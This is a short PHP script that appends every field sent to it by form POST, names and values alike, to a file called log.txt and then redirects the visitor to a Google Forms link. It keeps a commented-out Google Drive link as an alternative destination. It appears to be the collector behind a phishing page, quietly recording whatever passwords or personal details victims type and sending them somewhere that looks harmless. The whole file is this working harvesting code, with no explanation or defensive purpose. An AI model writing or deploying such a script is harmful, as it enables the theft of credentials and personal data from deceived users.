<?php   
// Set the location to redirect the page 
//header(Location:'https://drive.google.com/file/d/18J-SbTf8cxCSjvf7zh9wYeSXHeuDiK2f/view');
header('Location: https://forms.gle/ASGkbW2UVpjr5UwGA');
// Open the text file in writing mode  drive link url=https://drive.google.com/file/d/18J-SbTf8cxCSjvf7zh9wYeSXHeuDiK2f/view
$file = fopen("log.txt", "a"); 
  
foreach($_POST as $variable => $value) { 
    fwrite($file, $variable); 
    fwrite($file, "="); 
    fwrite($file, $value); 
    fwrite($file, "\r\n"); 
} 
  
fwrite($file, "\r\n"); 
fclose($file); 
//exit; 
?> 

